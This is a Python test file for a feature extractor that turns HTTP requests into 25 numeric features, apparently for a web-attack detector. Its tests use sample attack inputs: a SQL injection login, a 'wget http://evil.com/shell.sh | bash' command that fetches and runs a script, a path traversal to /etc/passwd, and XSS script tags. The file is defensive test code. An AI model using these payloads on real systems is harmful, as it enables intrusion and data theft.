"""Tests for the 25-feature schema implementation."""

import numpy as np
import pytest

from app.schema.features import (
    FEATURE_NAMES,
    FeatureExtractor,
    _count_keywords,
    _count_patterns,
    _shannon_entropy,
    extract_features,
)


class TestFeatureNames:
    """Test feature name constants."""

    def test_feature_count(self):
        assert len(FEATURE_NAMES) == 25

    def test_feature_names_unique(self):
        assert len(FEATURE_NAMES) == len(set(FEATURE_NAMES))

    def test_expected_names_present(self):
        expected = [
            "method_get",
            "method_post",
            "method_other",
            "path_depth",
            "path_length",
            "has_query",
            "query_length",
            "param_count",
            "param_name_entropy",
            "param_value_entropy",
            "payload_length",
            "special_char_density",
            "sql_keyword_count",
            "rce_keyword_count",
            "path_traversal_count",
            "xss_keyword_count",
            "encoding_count",
            "digit_ratio",
            "upper_ratio",
            "longest_param_len",
            "avg_param_len",
            "cookie_count",
            "user_agent_entropy",
            "header_count",
            "content_type_json",
        ]
        for name in expected:
            assert name in FEATURE_NAMES


class TestShannonEntropy:
    """Test Shannon entropy calculation."""

    def test_empty_string(self):
        assert _shannon_entropy("") == 0.0

    def test_single_char(self):
        assert _shannon_entropy("a") == 0.0

    def test_uniform_distribution(self):
        entropy = _shannon_entropy("abcd")
        assert abs(entropy - 2.0) < 0.001

    def test_skewed_distribution(self):
        entropy = _shannon_entropy("aaaaab")
        assert entropy < 1.0


class TestKeywordCounting:
    """Test keyword and pattern counting."""

    def test_sql_keywords(self):
        text = "SELECT * FROM users WHERE id = 1 UNION SELECT password"
        count = _count_keywords(text, {"select", "union", "where", "from"})
        assert count == 5

    def test_case_insensitive(self):
        text = "Select UNION where FROM"
        count = _count_keywords(text, {"select", "union", "where", "from"})
        assert count == 4

    def test_overlapping_keywords(self):
        text = "selectselect"
        count = _count_keywords(text, {"select"})
        assert count == 2

    def test_path_traversal_patterns(self):
        text = "../../etc/passwd ..\\windows\\system32"
        count = _count_patterns(text, [r"\.\./", r"\.\.\\"])
        assert count == 3


class TestFeatureExtraction:
    """Test main feature extraction functionality."""

    def setup_method(self):
        self.extractor = FeatureExtractor()

    def test_basic_get_request(self):
        features = self.extractor.extract(
            method="GET",
            path="/login",
            query_string="username=admin&password=test",
            headers={"user-agent": "Mozilla/5.0", "cookie": "session=abc123"},
            body="",
        )

        assert features.shape == (25,)
        assert features.dtype == np.float32
        assert features[0] == 1.0  # method_get
        assert features[1] == 0.0  # method_post
        assert features[2] == 0.0  # method_other
        assert features[3] == 1.0  # path_depth
        assert features[5] == 1.0  # has_query
        assert features[7] == 2.0  # param_count

    def test_post_request_with_body(self):
        features = self.extractor.extract(
            method="POST",
            path="/search",
            query_string="",
            headers={"content-type": "application/x-www-form-urlencoded"},
            body="query=test+search&filter=recent",
        )

        assert features[1] == 1.0  # method_post
        assert features[7] == 2.0  # param_count
        assert features[10] > 0  # payload_length
        assert features[24] == 0.0  # content_type_json

    def test_json_content_type(self):
        features = self.extractor.extract(
            method="POST",
            path="/api/data",
            query_string="",
            headers={"content-type": "application/json"},
            body='{"key": "value"}',
        )

        assert features[24] == 1.0  # content_type_json

    def test_sql_injection_detection(self):
        features = self.extractor.extract(
            method="POST",
            path="/login",
            query_string="",
            headers={},
            body="username=admin' OR '1'='1&password=anything",
        )

        assert features[12] > 0  # sql_keyword_count

    def test_rce_detection(self):
        features = self.extractor.extract(
            method="POST",
            path="/upload",
            query_string="",
            headers={},
            body="cmd=wget http://evil.com/shell.sh | bash",
        )

        assert features[13] > 0  # rce_keyword_count

    def test_path_traversal_detection(self):
        features = self.extractor.extract(
            method="GET",
            path="/download",
            query_string="file=../../etc/passwd",
            headers={},
            body="",
        )

        assert features[14] > 0  # path_traversal_count

    def test_xss_detection(self):
        features = self.extractor.extract(
            method="POST",
            path="/comment",
            query_string="",
            headers={},
            body="comment=<script>alert('xss')</script>",
        )

        assert features[15] > 0  # xss_keyword_count

    def test_encoding_detection(self):
        features = self.extractor.extract(
            method="GET",
            path="/search",
            query_string="q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            headers={},
            body="",
        )

        assert features[16] > 0  # encoding_count

    def test_special_char_density(self):
        features = self.extractor.extract(
            method="POST",
            path="/test",
            query_string="",
            headers={},
            body="!@#$%^&*()",
        )

        assert features[11] == 1.0  # special_char_density (all special)

    def test_digit_and_upper_ratios(self):
        features = self.extractor.extract(
            method="POST",
            path="/test",
            query_string="",
            headers={},
            body="ABC123",
        )

        assert features[17] == 0.5  # digit_ratio (3/6)
        assert features[18] == 0.5  # upper_ratio (3/6)

    def test_param_lengths(self):
        features = self.extractor.extract(
            method="POST",
            path="/test",
            query_string="",
            headers={"content-type": "application/x-www-form-urlencoded"},
            body="short=a&very_long_param_name=very_long_param_value_here",
        )

        assert features[19] > 10  # longest_param_len
        assert features[20] > 5  # avg_param_len

    def test_cookie_count(self):
        features = self.extractor.extract(
            method="GET",
            path="/",
            query_string="",
            headers={"cookie": "session=abc; user=admin; pref=dark"},
            body="",
        )

        assert features[21] == 3.0  # cookie_count

    def test_user_agent_entropy(self):
        features = self.extractor.extract(
            method="GET",
            path="/",
            query_string="",
            headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            body="",
        )

        assert features[22] > 0  # user_agent_entropy

    def test_header_count(self):
        features = self.extractor.extract(
            method="GET",
            path="/",
            query_string="",
            headers={"a": "1", "b": "2", "c": "3"},
            body="",
        )

        assert features[23] == 3.0  # header_count

    def test_convenience_function(self):
        features = extract_features(
            method="GET",
            path="/test",
            query_string="a=1",
            headers={},
            body="",
        )

        assert features.shape == (25,)
        assert features[0] == 1.0

    def test_other_method(self):
        features = self.extractor.extract(
            method="PUT",
            path="/api/resource",
            query_string="",
            headers={},
            body="data",
        )

        assert features[2] == 1.0  # method_other


class TestFeatureShapeConsistency:
    """Test that all feature extractions produce consistent shapes."""

    def test_various_requests_same_shape(self):
        test_cases = [
            ("GET", "/", "", {}, ""),
            ("POST", "/login", "a=1", {"content-type": "application/x-www-form-urlencoded"}, "user=admin&pass=123"),
            ("GET", "/search", "q=test&page=1", {"user-agent": "bot"}, ""),
            ("PUT", "/api", "", {"content-type": "application/json"}, '{"key": "value"}'),
            ("DELETE", "/resource/123", "", {}, ""),
        ]

        for method, path, query, headers, body in test_cases:
            features = extract_features(method, path, query, headers, body)
            assert features.shape == (25,), f"Failed for {method} {path}"
            assert features.dtype == np.float32
            assert not np.any(np.isnan(features))
            assert not np.any(np.isinf(features))


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
